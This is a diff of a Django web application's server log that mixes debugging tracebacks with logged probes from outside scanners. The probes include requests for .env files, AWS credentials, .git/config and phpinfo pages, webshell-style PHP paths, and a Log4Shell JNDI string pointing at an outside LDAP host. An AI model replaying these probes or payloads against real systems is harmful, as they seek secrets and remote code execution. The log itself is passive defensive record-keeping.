@@ -1,308 +1,234 @@
-WARNING 2023-10-03 03:32:00,441 log Not Found: /robots.txt
-WARNING 2023-10-03 03:33:03,576 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 05:06:39,419 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 05:12:51,587 log Not Found: /robots.txt
-WARNING 2023-10-03 05:28:45,136 log Not Found: /robots.txt
-WARNING 2023-10-03 05:44:08,497 log Not Found: /shop/nl/moncler-women-down-coats-designer-metallic-fabric-black/
-WARNING 2023-10-03 05:52:46,968 log Not Found: /robots.txt
-WARNING 2023-10-03 06:04:47,117 log Not Found: /p.php
-WARNING 2023-10-03 06:04:47,136 log Not Found: /t.php
-WARNING 2023-10-03 06:04:47,160 log Not Found: /by.php
-ERROR 2023-10-03 06:29:23,074 log Internal Server Error: /inquiry_details/
+WARNING 2023-10-04 03:30:03,603 log Not Found: /text.php
+WARNING 2023-10-04 03:30:06,481 log Not Found: /text.php
+WARNING 2023-10-04 03:30:08,915 log Not Found: /text.php
+WARNING 2023-10-04 03:30:27,534 log Not Found: /text.php
+WARNING 2023-10-04 03:31:09,644 log Not Found: /text.php
+WARNING 2023-10-04 03:31:15,387 log Not Found: /text.php
+WARNING 2023-10-04 03:31:24,344 log Not Found: /text.php
+WARNING 2023-10-04 04:02:40,346 log Not Found: /.env
+WARNING 2023-10-04 04:02:41,571 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 04:24:16,446 log Not Found: /robots.txt
+WARNING 2023-10-04 04:29:21,114 log Not Found: /Core/Skin/Login.aspx
+WARNING 2023-10-04 04:44:50,309 log Not Found: /robots.txt
+ERROR 2023-10-04 04:44:51,447 log Internal Server Error: /blog/create/
 Traceback (most recent call last):
   File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
     response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 481, in inquiry_details
-    p.save()
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/base.py", line 806, in save
-    self.save_base(
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/base.py", line 857, in save_base
-    updated = self._save_table(
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/base.py", line 1000, in _save_table
-    results = self._do_insert(
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/base.py", line 1041, in _do_insert
-    return manager._insert(
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/manager.py", line 85, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/query.py", line 1434, in _insert
-    return query.get_compiler(using=using).execute_sql(returning_fields)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1620, in execute_sql
-    for sql, params in self.as_sql():
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1547, in as_sql
-    value_rows = [
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1548, in <listcomp>
-    [
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1549, in <listcomp>
-    self.prepare_value(field, self.pre_save_val(field, obj))
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/sql/compiler.py", line 1487, in prepare_value
-    value = field.get_db_prep_save(value, connection=self.connection)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 910, in get_db_prep_save
-    return self.get_db_prep_value(value, connection=connection, prepared=False)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 1408, in get_db_prep_value
-    value = self.get_prep_value(value)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 1403, in get_prep_value
-    return self.to_python(value)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 1369, in to_python
-    raise exceptions.ValidationError(
-django.core.exceptions.ValidationError: ['“R C Jp” value has an invalid date format. It must be in YYYY-MM-DD format.']
-WARNING 2023-10-03 06:33:26,698 log Not Found: /shop/de/product/moncler-jacken-manner-zin-schwarz/
-WARNING 2023-10-03 06:39:58,247 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 06:55:56,163 log Not Found: /shop/product/moncler-jackets-men-quentin-khaki/
-WARNING 2023-10-03 07:02:48,542 log Not Found: /wp-content/plugins/WordPressSeo/include.php
-WARNING 2023-10-03 07:04:33,294 log Not Found: /wp-content/plugins/WordPressCore/include.php
-WARNING 2023-10-03 07:21:20,035 log Not Found: /contact/
-WARNING 2023-10-03 07:23:52,382 log Not Found: /owa/auth/logon.aspx
-WARNING 2023-10-03 07:47:22,711 log Not Found: /ab2g
-WARNING 2023-10-03 07:47:23,243 log Not Found: /ab2h
-WARNING 2023-10-03 07:47:27,496 log Not Found: /t4
-WARNING 2023-10-03 08:13:15,233 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 08:13:44,852 log Not Found: /.env
-WARNING 2023-10-03 08:13:46,237 log Forbidden (Referer checking failed - no Referer.): /
-WARNING 2023-10-03 08:25:50,588 log Not Found: /robots.txt
-WARNING 2023-10-03 08:25:53,618 log Not Found: /app.env.json
-WARNING 2023-10-03 08:37:03,448 log Not Found: /prod-secrets.env
-WARNING 2023-10-03 08:53:35,344 log Not Found: /robots.txt
-WARNING 2023-10-03 09:29:40,165 log Not Found: /robots.txt
-WARNING 2023-10-03 09:31:42,658 log Not Found: /2022/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:32:58,784 log Not Found: /wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:33:00,636 log Not Found: /cms/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:33:04,835 log Not Found: /robots.txt
-WARNING 2023-10-03 09:33:06,372 log Not Found: /humans.txt
-WARNING 2023-10-03 09:33:07,962 log Not Found: /ads.txt
-WARNING 2023-10-03 09:34:40,366 log Not Found: /shop/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:34:56,671 log Not Found: /wp1/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:35:07,562 log Not Found: /site/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:35:11,997 log Not Found: /news/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:35:35,958 log Not Found: /wordpress/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:36:31,014 log Not Found: /wp2/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:37:38,780 log Not Found: /wp/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:39:34,467 log Not Found: /test/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:40:05,670 log Not Found: /2021/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:40:22,809 log Not Found: /sito/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:40:27,439 log Not Found: /media/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:42:01,218 log Not Found: /2018/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:42:16,150 log Not Found: /web/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:43:14,050 log Not Found: /2020/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:43:47,704 log Not Found: /blog/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:44:06,826 log Not Found: /website/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 09:46:25,567 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 09:47:47,192 log Not Found: /2019/wp-includes/css/admin-bar-rtl.css
-WARNING 2023-10-03 10:27:23,629 log Not Found: /shop/it/product/moncler-giacche-bambini-daim-rose/
-WARNING 2023-10-03 10:40:18,995 log Not Found: /robots.txt
-WARNING 2023-10-03 10:45:43,672 log Not Found: /app_secrets.json
-WARNING 2023-10-03 11:01:15,956 log Not Found: /robots.txt
-WARNING 2023-10-03 11:08:49,777 log Not Found: /wp-content/plugins/WordPressCore/include.php
-WARNING 2023-10-03 11:08:56,826 log Not Found: /wp-content/plugins/core-plugin/include.php
-WARNING 2023-10-03 11:09:09,259 log Not Found: /wp-includes/widgets/include.php
-WARNING 2023-10-03 11:09:23,171 log Not Found: /wp-includes/images/include.php
-WARNING 2023-10-03 11:09:34,284 log Not Found: /wp-content/admin.php
-WARNING 2023-10-03 11:09:47,235 log Not Found: /wp-content/plugins/about.php
-WARNING 2023-10-03 11:09:56,866 log Not Found: /geju.php
-WARNING 2023-10-03 11:10:09,890 log Not Found: /ayk.php
-WARNING 2023-10-03 11:10:20,232 log Not Found: /wp.php
-WARNING 2023-10-03 11:19:34,168 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 11:23:42,160 log Not Found: /wp-content/plugins/WordPressCore/include.php
-WARNING 2023-10-03 11:23:57,531 log Not Found: /wp-content/plugins/core-plugin/include.php
-WARNING 2023-10-03 11:24:09,267 log Not Found: /wp-includes/widgets/include.php
-WARNING 2023-10-03 11:24:23,784 log Not Found: /wp-includes/images/include.php
-WARNING 2023-10-03 11:24:35,569 log Not Found: /wp-content/admin.php
-WARNING 2023-10-03 11:24:58,587 log Not Found: /wp-content/plugins/about.php
-WARNING 2023-10-03 11:25:07,169 log Not Found: /geju.php
-WARNING 2023-10-03 11:25:23,838 log Not Found: /ayk.php
-WARNING 2023-10-03 11:25:55,045 log Not Found: /wp.php
-WARNING 2023-10-03 11:27:22,847 log Not Found: /robots.txt
-WARNING 2023-10-03 11:28:18,701 log Not Found: /chatswood/
-WARNING 2023-10-03 11:30:54,950 log Not Found: /robots.txt
-WARNING 2023-10-03 11:47:06,545 log Not Found: /robots.txt
-WARNING 2023-10-03 11:47:06,978 log Not Found: /ads.txt
-WARNING 2023-10-03 12:00:36,197 log Not Found: /robots.txt
-ERROR 2023-10-03 12:10:52,588 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email()
-TypeError: sending_reminder_email() missing 1 required positional argument: 'user'
-ERROR 2023-10-03 12:16:54,847 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email(user1.email)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1757, in sending_reminder_email
-    {'name': user.name, 'email': user.email})
-AttributeError: 'str' object has no attribute 'name'
-ERROR 2023-10-03 12:18:48,741 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email(user.email)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1757, in sending_reminder_email
-    {'name': user.name, 'email': user.email})
-AttributeError: 'str' object has no attribute 'name'
-ERROR 2023-10-03 12:19:43,027 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email(user.email)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1757, in sending_reminder_email
-    {'name': user.name, 'email': user.email})
-AttributeError: 'str' object has no attribute 'name'
-ERROR 2023-10-03 12:22:49,570 log Internal Server Error: /reminder_detail/
+  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 220, in _get_response
+    response = response.render()
+  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/template/response.py", line 114, in render
+    self.content = self.rendered_content
+  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/template/response.py", line 90, in rendered_content
+    template = self.resolve_template(self.template_name)
+  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/template/response.py", line 72, in resolve_template
+    return select_template(template, using=self.using)
+  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/template/loader.py", line 47, in select_template
+    raise TemplateDoesNotExist(", ".join(template_name_list), chain=chain)
+django.template.exceptions.TemplateDoesNotExist: blog/post_form.html
+WARNING 2023-10-04 04:44:52,275 log Not Found: /sitemap.xml
+WARNING 2023-10-04 05:01:30,159 log Not Found: /wp-content/plugins/core-plugin/include.php
+WARNING 2023-10-04 05:01:35,173 log Not Found: /wp-content/plugins/WordPressCore/include.php
+WARNING 2023-10-04 05:01:41,374 log Not Found: /wp-includes/images/include.php
+WARNING 2023-10-04 05:01:43,599 log Not Found: /wp-includes/widgets/include.php
+WARNING 2023-10-04 05:13:48,008 log Not Found: /wp-content/plugins/WordPressCore/include.php
+WARNING 2023-10-04 05:15:08,281 log Forbidden (Referer checking failed - no Referer.): /inquiry_details/
+WARNING 2023-10-04 05:15:08,837 log Forbidden (Referer checking failed - no Referer.): /inquiry_details/
+WARNING 2023-10-04 05:15:09,737 log Forbidden (Referer checking failed - no Referer.): /inquiry_details/
+WARNING 2023-10-04 05:15:11,189 log Forbidden (Referer checking failed - no Referer.): /inquiry_details2/
+WARNING 2023-10-04 05:15:12,096 log Forbidden (Referer checking failed - no Referer.): /inquiry_details2/
+WARNING 2023-10-04 05:15:12,653 log Forbidden (Referer checking failed - no Referer.): /inquiry_details2/
+WARNING 2023-10-04 05:15:14,786 log Forbidden (Referer checking failed - no Referer.): /inquiry_details1/
+WARNING 2023-10-04 05:15:15,342 log Forbidden (Referer checking failed - no Referer.): /inquiry_details1/
+WARNING 2023-10-04 05:15:16,245 log Forbidden (Referer checking failed - no Referer.): /inquiry_details1/
+WARNING 2023-10-04 05:15:58,253 log Not Found: /products/news/
+WARNING 2023-10-04 05:15:58,775 log Not Found: /products/news/
+WARNING 2023-10-04 05:15:59,266 log Not Found: /products/news/
+WARNING 2023-10-04 05:15:59,754 log Not Found: /products/news/
+WARNING 2023-10-04 05:16:00,242 log Not Found: /products/news/
+WARNING 2023-10-04 05:16:00,732 log Not Found: /products/news/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:16:01,221 log Not Found: /products/news/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:16:01,709 log Not Found: /products/registry/
+WARNING 2023-10-04 05:16:02,240 log Not Found: /products/registry/
+WARNING 2023-10-04 05:16:02,736 log Not Found: /products/registry/
+WARNING 2023-10-04 05:16:03,224 log Not Found: /products/registry/
+WARNING 2023-10-04 05:16:04,058 log Not Found: /products/registry/
+WARNING 2023-10-04 05:16:04,549 log Not Found: /products/registry/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:16:05,038 log Not Found: /products/registry/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:16:05,526 log Not Found: /technology/ai/
+WARNING 2023-10-04 05:16:06,064 log Not Found: /technology/ai/
+WARNING 2023-10-04 05:16:06,552 log Not Found: /technology/ai/
+WARNING 2023-10-04 05:16:07,040 log Not Found: /technology/ai/
+WARNING 2023-10-04 05:16:07,529 log Not Found: /technology/ai/
+WARNING 2023-10-04 05:16:08,018 log Not Found: /technology/ai/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:16:08,508 log Not Found: /technology/ai/uni_subscribe_email=dill_chancy@yahoo.com
+WARNING 2023-10-04 05:35:22,973 log Not Found: /wp-content/plugins/core-plugin/include.php
+WARNING 2023-10-04 05:35:28,697 log Not Found: /wp-content/plugins/WordPressCore/include.php
+WARNING 2023-10-04 05:35:34,495 log Not Found: /wp-includes/images/include.php
+WARNING 2023-10-04 05:35:38,814 log Not Found: /wp-includes/widgets/include.php
+WARNING 2023-10-04 05:46:20,858 log Not Found: //.env
+WARNING 2023-10-04 05:47:43,755 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 05:48:09,580 log Not Found: /Res/login.html
+WARNING 2023-10-04 05:48:09,584 log Not Found: /robots.txt
+WARNING 2023-10-04 05:48:09,589 log Not Found: /99vt
+WARNING 2023-10-04 05:48:09,890 log Not Found: /aaaaaaaaaaaaaaaaaaaaaaaaaqr
+WARNING 2023-10-04 05:48:09,892 log Not Found: /robots.txt
+WARNING 2023-10-04 05:48:10,309 log Not Found: /99vu
+WARNING 2023-10-04 06:02:58,678 log Not Found: /Core/Skin/Login.aspx
+WARNING 2023-10-04 06:04:09,150 log Not Found: //.env
+WARNING 2023-10-04 06:05:32,076 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 06:12:09,022 log Not Found: /robots.txt
+WARNING 2023-10-04 06:20:05,916 log Not Found: /robots.txt
+WARNING 2023-10-04 06:29:28,882 log Not Found: /robots.txt
+WARNING 2023-10-04 06:32:06,781 log Not Found: /robots.txt
+WARNING 2023-10-04 06:32:07,418 log Not Found: /robots.txt
+WARNING 2023-10-04 06:35:47,991 log Not Found: /wp-content/themes/twentyfive/include.php
+WARNING 2023-10-04 06:40:24,328 log Not Found: /shop/da/product/moncler-down-coat-maend-elegance-army-green/
+WARNING 2023-10-04 07:02:43,015 log Not Found: /apple-touch-icon-120x120-precomposed.png
+WARNING 2023-10-04 07:02:43,026 log Not Found: /apple-touch-icon-120x120.png
+WARNING 2023-10-04 07:04:58,285 log Not Found: /.env.bak
+WARNING 2023-10-04 07:04:58,525 log Not Found: /.env
+WARNING 2023-10-04 07:04:58,765 log Not Found: /core/.env
+WARNING 2023-10-04 07:04:59,004 log Not Found: /public/.env
+WARNING 2023-10-04 07:04:59,244 log Not Found: /app/.env
+WARNING 2023-10-04 07:04:59,485 log Not Found: /laravel/core/.env
+WARNING 2023-10-04 07:04:59,724 log Not Found: /beta/.env
+WARNING 2023-10-04 07:04:59,963 log Not Found: /config/.env
+WARNING 2023-10-04 07:05:00,204 log Not Found: /kyc/.env
+WARNING 2023-10-04 07:05:00,949 log Not Found: /prod/.env
+WARNING 2023-10-04 07:05:01,188 log Not Found: /api/.env
+WARNING 2023-10-04 07:05:01,428 log Not Found: /tokenlite_app/.env
+WARNING 2023-10-04 07:05:01,669 log Not Found: /backend/.env
+WARNING 2023-10-04 07:05:01,908 log Not Found: /env.backup
+WARNING 2023-10-04 07:05:02,149 log Not Found: /.environment
+WARNING 2023-10-04 07:05:02,389 log Not Found: /.envrc
+WARNING 2023-10-04 07:05:02,628 log Not Found: /.envs
+WARNING 2023-10-04 07:05:02,870 log Not Found: /.env~
+WARNING 2023-10-04 07:05:03,110 log Not Found: /phpinfo
+WARNING 2023-10-04 07:05:03,350 log Not Found: /php_info
+WARNING 2023-10-04 07:05:03,592 log Not Found: /_profiler/phpinfo
+WARNING 2023-10-04 07:05:03,833 log Not Found: /phpinfo.php
+WARNING 2023-10-04 07:05:04,072 log Not Found: /info.php
+WARNING 2023-10-04 07:05:05,473 log Not Found: /_ignition/execute-solution
+WARNING 2023-10-04 07:05:05,713 log Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+WARNING 2023-10-04 07:36:56,144 log Not Found: /Core/Skin/Login.aspx
+WARNING 2023-10-04 07:42:17,044 log Not Found: /robots.txt
+WARNING 2023-10-04 07:42:17,690 log Not Found: /robots.txt
+WARNING 2023-10-04 08:09:56,187 log Not Found: /robots.txt
+WARNING 2023-10-04 08:27:28,996 log Not Found: /images/favicon.ico
+WARNING 2023-10-04 08:27:29,384 log Not Found: /images/favicon.ico
+WARNING 2023-10-04 08:57:58,640 log Not Found: /dns-query
+WARNING 2023-10-04 08:57:59,778 log Not Found: /dns-query
+WARNING 2023-10-04 08:58:01,365 log Not Found: /dns-query
+WARNING 2023-10-04 08:58:02,937 log Not Found: /dns-query
+WARNING 2023-10-04 08:58:05,352 log Not Found: /dns-query
+WARNING 2023-10-04 08:58:07,174 log Not Found: /dns-query
+WARNING 2023-10-04 08:58:09,069 log Not Found: /query
+WARNING 2023-10-04 08:58:10,999 log Not Found: /query
+WARNING 2023-10-04 08:58:12,089 log Not Found: /query
+WARNING 2023-10-04 08:58:13,292 log Not Found: /query
+WARNING 2023-10-04 08:58:14,890 log Not Found: /query
+WARNING 2023-10-04 08:58:16,326 log Not Found: /query
+WARNING 2023-10-04 08:58:18,648 log Not Found: /resolve
+WARNING 2023-10-04 08:58:20,292 log Not Found: /resolve
+WARNING 2023-10-04 08:58:21,778 log Not Found: /resolve
+WARNING 2023-10-04 08:58:23,481 log Not Found: /resolve
+WARNING 2023-10-04 08:58:25,347 log Not Found: /resolve
+WARNING 2023-10-04 08:58:27,289 log Not Found: /resolve
+WARNING 2023-10-04 08:58:34,511 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 08:58:35,777 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 09:07:00,097 log Not Found: /phpinfo.php
+WARNING 2023-10-04 09:07:00,700 log Not Found: /info.php
+WARNING 2023-10-04 09:07:01,301 log Not Found: /phpinfo
+WARNING 2023-10-04 09:07:01,903 log Not Found: /php.php
+WARNING 2023-10-04 09:07:02,504 log Not Found: /php_info.php
+WARNING 2023-10-04 09:07:03,107 log Not Found: /phptest.php
+WARNING 2023-10-04 09:07:03,706 log Not Found: /dashboard/phpinfo.php
+WARNING 2023-10-04 09:07:04,305 log Not Found: /infophp.php
+WARNING 2023-10-04 09:07:04,904 log Not Found: /p.php
+WARNING 2023-10-04 09:07:05,505 log Not Found: /_profiler/phpinfo
+WARNING 2023-10-04 09:07:06,106 log Not Found: /info.php
+WARNING 2023-10-04 09:07:06,707 log Not Found: /pinfo.php
+WARNING 2023-10-04 09:07:07,308 log Not Found: /scripts/phpinfo.php
+WARNING 2023-10-04 09:07:07,908 log Not Found: /phpinfo.php
+WARNING 2023-10-04 09:07:09,106 log Not Found: /phpinfo/phpinfo.php
+WARNING 2023-10-04 09:07:09,705 log Not Found: /information.php
+WARNING 2023-10-04 09:07:10,903 log Not Found: /phpinformation
+WARNING 2023-10-04 09:07:11,505 log Not Found: /php-info.php
+WARNING 2023-10-04 09:07:12,109 log Not Found: /phpversion.php
+WARNING 2023-10-04 09:07:12,708 log Not Found: /webdav/phpinfo.php
+WARNING 2023-10-04 09:07:13,308 log Not Found: /webdav/phpinfo
+WARNING 2023-10-04 09:07:13,908 log Not Found: /webdav/info.php
+WARNING 2023-10-04 09:07:14,508 log Not Found: /testphpinfo.php
+WARNING 2023-10-04 09:07:15,109 log Not Found: /testphpinfo
+WARNING 2023-10-04 09:07:15,710 log Not Found: /admin.php
+WARNING 2023-10-04 09:07:16,308 log Not Found: /_phpinfo.php
+WARNING 2023-10-04 09:07:16,909 log Not Found: /PHPConf.php
+WARNING 2023-10-04 09:07:17,510 log Not Found: /viewinfo.php
+WARNING 2023-10-04 09:07:18,113 log Not Found: /info/phpinfo.php
+WARNING 2023-10-04 09:07:18,714 log Not Found: /info/info.php
+WARNING 2023-10-04 09:07:19,314 log Not Found: /.env
+WARNING 2023-10-04 09:07:19,915 log Not Found: /.env.save
+WARNING 2023-10-04 09:07:20,516 log Not Found: /.env.old
+WARNING 2023-10-04 09:07:21,118 log Not Found: /.env.prod
+WARNING 2023-10-04 09:07:21,717 log Not Found: /.env.production
+WARNING 2023-10-04 09:07:22,317 log Not Found: /.env.development
+WARNING 2023-10-04 09:07:22,920 log Not Found: /laravel/.env
+WARNING 2023-10-04 09:07:23,521 log Not Found: /admin-app/.env
+WARNING 2023-10-04 09:07:24,127 log Not Found: /api/.env
+WARNING 2023-10-04 09:07:24,726 log Not Found: /app/.env
+WARNING 2023-10-04 09:07:25,326 log Not Found: /development/.env
+WARNING 2023-10-04 09:07:25,930 log Not Found: /apps/.env
+WARNING 2023-10-04 09:07:26,529 log Not Found: /.aws/credentials
+WARNING 2023-10-04 09:07:27,128 log Not Found: /private/.env
+WARNING 2023-10-04 09:07:27,728 log Not Found: /system/.env
+WARNING 2023-10-04 09:07:28,329 log Not Found: /docker/.env
+WARNING 2023-10-04 09:07:28,929 log Not Found: /cms/.env
+WARNING 2023-10-04 09:07:29,530 log Not Found: /script/.env
+WARNING 2023-10-04 09:07:30,129 log Not Found: /live_env
+WARNING 2023-10-04 09:07:30,730 log Not Found: /application/.env
+WARNING 2023-10-04 09:07:31,330 log Not Found: /.env.project
+WARNING 2023-10-04 09:07:31,929 log Not Found: /.env.dist
+WARNING 2023-10-04 09:07:32,528 log Not Found: /back/.env
+WARNING 2023-10-04 09:07:33,129 log Not Found: /core/.env
+WARNING 2023-10-04 09:07:33,727 log Not Found: /docker/.env
+WARNING 2023-10-04 09:07:34,327 log Not Found: /fedex/.env
+WARNING 2023-10-04 09:07:34,927 log Not Found: /local/.env
+WARNING 2023-10-04 09:07:35,527 log Not Found: /rest/.env
+WARNING 2023-10-04 09:07:36,127 log Not Found: /shared/.env
+WARNING 2023-10-04 09:07:36,727 log Not Found: /sources/.env
+WARNING 2023-10-04 09:07:37,329 log Not Found: /enviroments/.env.production
+WARNING 2023-10-04 09:07:37,930 log Not Found: /enviroments/.env
+WARNING 2023-10-04 09:07:38,528 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 09:10:50,042 log Not Found: /Core/Skin/Login.aspx
+WARNING 2023-10-04 09:18:05,931 log Not Found: /${jndi:ldap://196.21.83.146:1389/Exploit}
+WARNING 2023-10-04 09:18:06,417 log Not Found: /${jndi:ldap://196.21.83.146:1389/Exploit}
+WARNING 2023-10-04 09:22:47,367 log Not Found: /robots.txt
+WARNING 2023-10-04 09:30:19,401 log Not Found: /.env
+WARNING 2023-10-04 09:30:20,691 log Forbidden (Referer checking failed - no Referer.): /
+WARNING 2023-10-04 09:35:17,145 log Not Found: /shop/sv/product/moncler-moka-3/
+WARNING 2023-10-04 09:37:53,357 log Not Found: /.env
+WARNING 2023-10-04 09:38:03,091 log Not Found: /.git/config
+ERROR 2023-10-04 09:47:16,427 log Internal Server Error: /reminder_detail/
 Traceback (most recent call last):
   File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
     response = get_response(request)
   File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
     response = wrapped_callback(request, *callback_args, **callback_kwargs)
   File "/home/ubuntu/github/easygo/basecamp/views.py", line 1786, in reminder_detail
-    sending_reminder_email(user.email)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1756, in sending_reminder_email
-    user = Post.objects.get(email=user.email)
-AttributeError: 'str' object has no attribute 'email'
-ERROR 2023-10-03 12:24:02,111 log Internal Server Error: /reminder_detail/
+    sending_reminder_email(user)
+  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1754, in sending_reminder_email
+    {{'name': user.name, 'flight_date': user.flight_date, 'flight_number': user.flight_number,
+TypeError: unhashable type: 'dict'
+ERROR 2023-10-04 09:48:16,212 log Internal Server Error: /reminder_detail/
 Traceback (most recent call last):
   File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
     response = get_response(request)
   File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
     response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email(user.email)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1757, in sending_reminder_email
-    {'name': user.name, 'email': user.email})
-AttributeError: 'str' object has no attribute 'name'
-ERROR 2023-10-03 12:24:46,577 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1785, in reminder_detail
-    sending_reminder_email()
